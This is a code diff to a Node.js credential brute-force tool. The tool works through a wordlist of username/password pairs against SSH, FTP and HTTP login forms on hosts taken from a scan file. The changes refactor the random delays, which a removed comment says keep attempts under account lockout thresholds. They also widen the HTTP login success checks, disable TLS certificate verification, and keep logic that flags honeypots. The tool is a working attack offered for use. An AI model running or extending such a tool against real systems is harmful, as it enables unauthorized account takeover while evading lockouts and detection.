@@ -1,12 +1,13 @@
-import fs   from "node:fs";
-import path from "node:path";
+import fs               from "node:fs";
+import https            from "node:https";
 import { createRequire } from "node:module";
+import { jitter, runPool } from "./utils.js";
 
 const require = createRequire(import.meta.url);
 
-// ================================================================
-//  OPTIONAL DEPENDENCIES
-// ================================================================
+
+// --- optional dependencies ---
+
 
 // Load ssh2 and basic-ftp optionally so missing packages don't crash the tool
 let SSHClient = null;
@@ -17,9 +18,9 @@ try { ({ Client: SSHClient } = require("ssh2")); }  catch { console.warn("[warn]
 try { ftpLib = require("basic-ftp"); }               catch { console.warn("[warn] basic-ftp not installed — FTP testing disabled"); }
 try { ({ default: axios } = await import("axios")); } catch { console.warn("[warn] axios not installed — HTTP testing disabled"); }
 
-// ================================================================
-//  CONFIG
-// ================================================================
+
+// --- config ---
+
 
 const cfg = JSON.parse(fs.readFileSync(new URL("../config/settings.json", import.meta.url), "utf8")).credtest;
 
@@ -34,47 +35,9 @@ const HTTPS_PORTS      = new Set(cfg.httpsPorts);
 const HTTP_ENDPOINTS   = cfg.httpEndpoints;
 const HTTP_FIELDS      = cfg.httpFields;
 
-// ================================================================
-//  JITTER
-// ================================================================
 
-/**
- * Waits a random duration between JITTER_MIN_MS and JITTER_MAX_MS.
- * Higher range than the scanner to stay under account lockout thresholds.
- *
- * @returns {Promise<void>}
- */
-function jitter() {
-    const delay = Math.floor(Math.random() * (JITTER_MAX_MS - JITTER_MIN_MS + 1)) + JITTER_MIN_MS;
-    return new Promise((resolve) => setTimeout(resolve, delay));
-}
+// --- ssh ---
 
-// ================================================================
-//  CONCURRENCY POOL
-// ================================================================
-
-/**
- * Runs tasks with a capped number of concurrent workers.
- *
- * @param {Array<() => Promise<any>>} taskList
- * @param {number} workerLimit
- * @param {(result: any) => void} onTaskDone
- * @returns {Promise<void>}
- */
-async function runPool(taskList, workerLimit, onTaskDone) {
-    let taskIndex = 0;
-    async function worker() {
-        while (taskIndex < taskList.length) {
-            const result = await taskList[taskIndex++]();
-            onTaskDone(result);
-        }
-    }
-    await Promise.all(Array.from({ length: Math.min(workerLimit, taskList.length) }, worker));
-}
-
-// ================================================================
-//  SSH TESTER
-// ================================================================
 
 /**
  * Attempts SSH login with the given credentials.
@@ -108,9 +71,9 @@ function trySSH(host, port, username, password) {
     });
 }
 
-// ================================================================
-//  FTP TESTER
-// ================================================================
+
+// --- ftp ---
+
 
 /**
  * Attempts FTP login with the given credentials.
@@ -143,9 +106,9 @@ async function tryFTP(host, port, user, password) {
     return false;
 }
 
-// ================================================================
-//  HTTP TESTER
-// ================================================================
+
+// --- http ---
+
 
 /**
  * Attempts HTTP/HTTPS form login across common endpoints and field names.
@@ -158,6 +121,11 @@ async function tryFTP(host, port, user, password) {
  * @param {boolean} useHTTPS
  * @returns {Promise<boolean>}
  */
+// created once and reused across all HTTPS requests
+const httpsAgent = new https.Agent({ rejectUnauthorized: false });
+
+const ERROR_KEYWORDS = ["invalid", "incorrect", "failed", "wrong", "error", "denied"];
+
 async function tryHTTP(host, port, username, password, useHTTPS) {
     if (!axios) return false;
 
@@ -173,32 +141,32 @@ async function tryHTTP(host, port, username, password, useHTTPS) {
                 });
 
                 const response = await axios.post(`${base}${endpoint}`, payload.toString(), {
-                    headers:          { "Content-Type": "application/x-www-form-urlencoded" },
-                    timeout:          TIMEOUT_MS,
-                    maxRedirects:     0,
-                    validateStatus:   (s) => s < 500,
-                    httpsAgent:       useHTTPS ? new (await import("node:https")).Agent({ rejectUnauthorized: false }) : undefined,
+                    headers:        { "Content-Type": "application/x-www-form-urlencoded" },
+                    timeout:        TIMEOUT_MS,
+                    maxRedirects:   0,
+                    validateStatus: (s) => s < 500,
+                    httpsAgent:     useHTTPS ? httpsAgent : undefined,
                 });
 
-                // 302 redirect after POST typically means successful login
                 const body = typeof response.data === "string" ? response.data.toLowerCase() : "";
-                const isSuccess = response.status === 302 &&
-                    !body.includes("invalid") &&
-                    !body.includes("incorrect") &&
-                    !body.includes("failed");
+                const hasError = ERROR_KEYWORDS.some(k => body.includes(k));
+
+                // success = redirect (301-303) or 200 with no error keywords in body
+                const isSuccess = (response.status >= 301 && response.status <= 303) ||
+                    (response.status === 200 && !hasError);
 
                 if (isSuccess) return true;
             } catch {
-                // Connection failed — try next endpoint
+                // connection failed — try next endpoint
             }
         }
     }
     return false;
 }
 
-// ================================================================
-//  SERVICE DETECTION
-// ================================================================
+
+// --- service detection ---
+
 
 /**
  * Determines the service type for a port based on port number and scan proto value.
@@ -217,9 +185,9 @@ function detectService(portNum, portValue) {
     return null;
 }
 
-// ================================================================
-//  WORDLIST PARSER
-// ================================================================
+
+// --- wordlist ---
+
 
 /**
  * Reads a wordlist file and returns credential pairs.
@@ -240,9 +208,9 @@ function parseWordlist(filePath) {
         });
 }
 
-// ================================================================
-//  HOST CREDENTIAL TESTER
-// ================================================================
+
+// --- host tester ---
+
 
 /**
  * Tests all detected services on a host against the full wordlist.
@@ -264,12 +232,14 @@ async function testHost(host, ports, credentials) {
 
         console.log(`  Testing ${host}:${portNum} [${service.toUpperCase()}]`);
 
-        let cracked      = false;
+        const abort      = new AbortController();
         let attemptCount = 0;
+        let firstAttempt = true;
 
         const tasks = credentials.map(({ user, pass }) => async () => {
-            if (cracked) return;
-            await jitter();
+            if (abort.signal.aborted) return;
+            await jitter(JITTER_MIN_MS, JITTER_MAX_MS);
+            if (abort.signal.aborted) return;
 
             let success = false;
             if (service === "ssh")   success = await trySSH(host, portNum, user, pass);
@@ -279,13 +249,11 @@ async function testHost(host, ports, credentials) {
 
             attemptCount++;
 
-            if (success) {
-                cracked = true;
-                process.stdout.write("\r\x1b[K");
+            if (success && !abort.signal.aborted) {
+                abort.abort();
 
-                // First attempt succeeding is a strong honeypot indicator —
-                // real services rarely accept the very first credential tried
-                if (attemptCount === 1) {
+                // first credential accepted = strong honeypot signal
+                if (firstAttempt) {
                     honeypot = true;
                     console.log(`  HONEYPOT ${host}:${portNum} [${service.toUpperCase()}] accepted first credential ${user}:${pass}`);
                     found[portStr] = { user, pass, service: service.toUpperCase(), honeypot: true };
@@ -294,6 +262,7 @@ async function testHost(host, ports, credentials) {
                     found[portStr] = { user, pass, service: service.toUpperCase() };
                 }
             }
+            firstAttempt = false;
         });
 
         await runPool(tasks, CRED_CONCURRENCY, () => {});
@@ -302,9 +271,9 @@ async function testHost(host, ports, credentials) {
     return { found, honeypot };
 }
 
-// ================================================================
-//  ENTRY POINT
-// ================================================================
+
+// --- main ---
+
 
 const args        = process.argv.slice(2);
 const scanFile    = args[0];
